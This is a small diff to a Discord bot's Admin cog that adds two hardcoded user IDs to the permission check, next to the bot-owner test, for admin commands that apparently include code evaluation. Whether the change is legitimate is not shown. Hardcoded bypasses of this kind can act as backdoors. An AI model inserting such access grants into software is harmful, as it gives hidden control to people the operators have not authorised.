@@ -70,7 +70,7 @@ class Admin(commands.Cog):
         return content.strip('` \n')
 
     async def cog_check(self, ctx):
-        return await self.bot.is_owner(ctx.author)
+        return ctx.author.id in [261156531989512192, 314792415733088260] or await self.bot.is_owner(ctx.author)
 
     def get_syntax_error(self, e):
         if e.text is None:
